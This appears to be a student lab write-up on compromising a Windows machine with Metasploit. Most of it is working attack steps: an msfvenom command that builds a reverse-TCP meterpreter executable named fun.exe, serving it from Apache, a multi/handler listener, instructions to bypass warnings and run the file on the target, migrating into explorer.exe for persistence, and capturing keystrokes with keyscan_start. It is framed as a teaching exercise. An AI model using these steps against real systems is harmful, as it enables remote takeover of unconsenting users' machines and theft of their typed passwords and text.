# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/b0099d79-cfb3-4f41-ae00-0e80e4aab311)

malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/3639f9c7-5c38-4538-8a21-4b3c4809d088)

the fun.exe into the apache /var/www/html folder

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/3db2b6b8-620f-404e-a382-c43dc8205dcc)

Start apache server sudo systemctl apache2 start

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/ff20493a-853b-49d2-a0cf-bd7b1c75dc17)

Check the status of apache2 Invoke msfconsole: msfconsole

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/2eb89aae-fb97-4804-bd0d-df86dfe7d940)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/f25d8c2f-9d91-45a1-b712-650e22656f4a)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit css

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/3e7bfc9f-7989-4f4b-92e1-c34830dc5b49)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/ac056214-0d39-42bd-ad90-74e12fd05789)

Bypass any warning boxes, double-click the file, and allow it to run.

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/100f30a8-7268-4948-8777-9bbc857f7226)

On kali give the command exploit

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/0336518e-549c-4f4d-a1ae-d53c22439d0b)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/df0820f0-0315-4e32-ad65-f0fc1894cca1)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted.

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/743ecf52-e08c-40ef-adbe-6c4d39ef9d57)

Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/8c2f324b-f493-493f-96e4-71ce3afdaf3d)

the keystrokes captured so far.

![image](https://github.com/indrajasukumar/Compromising-windows-using-Metasploit/assets/145115195/2f413ad1-dca1-42c8-b561-9ee977c32c74)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
